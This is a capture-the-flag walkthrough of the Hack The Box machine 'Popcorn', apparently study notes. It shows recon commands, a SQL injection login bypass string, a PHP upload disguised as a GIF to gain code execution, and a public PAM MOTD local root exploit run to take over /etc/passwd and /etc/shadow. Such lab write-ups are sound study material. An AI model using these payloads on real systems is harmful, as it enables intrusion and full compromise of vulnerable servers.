# Popcorn (User/Root Compromise)
- Target IP: 10.129.24.130

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 22, 80 TCP open
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# Output
# Apache httpd 2.2.12
# http-title: Did not follow redirect to http://popcorn.htb/
# Service Info: Host: popcorn.hackthebox.gr
# /etc/hosts >> 10.129.24.130 popcorn.htb popcorn.hackthebox.gr
```

```bash
gobuster dir \ 
-w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt \ 
--url http://popcorn.htb/

# Output
# /test -> phpinfo()
# /index -> "It works!" page
# /torrent -> Torent Hoster
# /rename -> Renamer API Syntax: http://popcorn.htb/rename/index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
```

## Username Enumeration
```
POST /torrent/users/index.php?mode=register HTTP/1.1
Host: popcorn.htb

username=admin&password=admin&password2=admin&email=admin%40admin.htb&number=d5e42

--- Response
<div class="normal" id="news">-The username <b>admin</b> already exists</div>
```

## Unrestricted File Renaming
```
GET /rename/indexs.php?filename=/var/www/rename/index.php&newfilename=/var/www/rename/indexs.php HTTP/1.1

--- Response
HTTP/1.1 200 OK
OK!
```

```
GET /rename/indexs.php?filename=/var/www/torrent/torrents.php&newfilename=/var/www/torrent/torrents.php.txt HTTP/1.1

# Allows us to read the source of torrents.php
```

# Source Analysis
## SQL Injection
- String concatenation vs prepared statement
```php
/* OSWE/HTB/Popcorn/Source/torrent/login.php */
$qid = db_query("
	SELECT userName, password, privilege, email
	FROM users
	WHERE userName = '$username' AND password = '" . md5($password) . "'
	");
```
### Manual Auth Bypass
```
username=admin'#--&password=romanrii
```

## Upload Restrictions Bypass
```php
/* OSWE/HTB/Popcorn/Source/torrent/upload_file.php */
if (($_FILES["file"]["type"] == "image/gif")
  || ($_FILES["file"]["type"] == "image/jpeg")
  || ($_FILES["file"]["type"] == "image/jpg")
  || ($_FILES["file"]["type"] == "image/png")
  && ($_FILES["file"]["size"] < 100000))
```

```
POST /torrent/upload_file.php?mode=upload&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4 HTTP/1.1
Host: popcorn.htb

------geckoformboundaryc03db213e2bddfefb219742aee8d9c95
Content-Disposition: form-data; name="file"; filename="background.php"
Content-Type: image/gif

<?php phpinfo(); ?>
```
- PHP Info can now be seen via `/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php`

- Weaponized payload uploaded to OSWE/HTB/Popcorn/Payloads/weaponized.php -> Reverse Shell -> User flag.txt

# Priv-Esc
```bash
lsb_release -a

# No LSB modules are available.
# Distributor ID: Ubuntu
# Description:    Ubuntu 9.10
# Release:        9.10
# Codename:       karmic
```
- Research Ubuntu 9.10 Karmix exploits
-- https://www.exploit-db.com/exploits/14339
-- Needed to adjust instances of `~/` to `/var/www` since we do not have a $HOME set
```bash
www-data@popcorn:/var/www$ bash exploit.sh                                                                                                                                           [27/1481]
bash exploit.sh                                                                                                                                                                               
[*] Ubuntu PAM MOTD local root                                                                                                                                                                
[*] Backuped /var/www/.ssh/authorized_keys                                                                                                                                                    
[*] SSH key set up                                                                                                                                                                            
[*] Backuped /var/www/.cache                                                                                                                                                                  
[*] spawn ssh                                                                                                                                                                                 
[+] owned: /etc/passwd                                                                                                                                                                        
[*] spawn ssh                                                                                                                                                                                 
[+] owned: /etc/shadow                                                                                                                                                                        
[*] Restored /var/www/.cache                                                                                                                                                                  
[*] Restored /var/www/.ssh/authorized_keys
[*] SSH key removed      
[+] Success! Use password toor to get root
Password: toor                                                                                 
                                               
root@popcorn:/var/www# whoami
whoami
root                       
```